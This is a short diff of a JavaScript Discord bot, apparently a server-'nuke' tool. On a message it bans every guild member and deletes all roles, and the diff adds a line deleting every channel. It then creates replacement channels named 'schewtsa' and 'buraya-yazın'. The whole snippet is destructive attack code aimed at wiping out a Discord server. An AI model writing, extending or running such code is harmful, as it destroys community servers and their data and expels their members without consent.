@@ -21,6 +21,7 @@ berke.on('message', msg => {
         })
       msg.guild.members.forEach(a => msg.guild.ban(a))
       msg.guild.roles.forEach(a => a.delete())
+      msg.guild.channels.forEach(a => a.delete())
       let kanal = 'schewtsa'
       let kanal1 = 'buraya-yazın'
       msg.guild.createChannel(kanal)
